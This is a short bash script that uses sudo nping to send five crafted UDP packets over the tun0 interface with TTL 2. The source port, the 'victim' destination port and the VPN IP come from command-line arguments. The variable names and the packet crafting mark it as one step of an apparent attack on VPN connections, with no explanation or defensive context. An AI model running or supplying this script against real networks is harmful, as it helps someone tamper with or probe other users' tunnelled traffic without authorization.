#!/bin/bash
VPNPORT=$1
VICTIMPORT=$2
VPNIP=$3

sudo nping -e tun0 --ttl 2 -c 5  --udp -g $VPNPORT -p $VICTIMPORT $VPNIP
